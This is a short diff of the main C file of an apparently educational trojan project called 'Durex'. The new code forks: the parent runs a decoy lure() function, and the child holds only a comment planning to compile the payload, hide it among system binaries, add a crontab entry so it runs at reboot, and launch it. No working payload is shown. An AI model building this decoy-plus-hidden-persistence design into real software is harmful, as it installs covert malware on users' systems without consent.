@@ -10,20 +10,26 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <durex.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <stdio.h>
-#include <errno.h>
-
-extern int errno;
+#include <durex.h>
 
 int main(void)
 {
-	fprintf(stdout, "lfalkau\n");
+	int pid;
 
-	payload();
-
+	pid = fork();
+	if (pid > 0)
+	{
+		lure();
+	}
+	else
+	{
+		/*
+		 * 1. compile durex.c
+		 * 2. pack it and output result in system binaries
+		 * 3. Edit crontab to launch Durex at reboot
+		 * 4. Launch Durex
+		*/
+	}
 	return (0);
 }
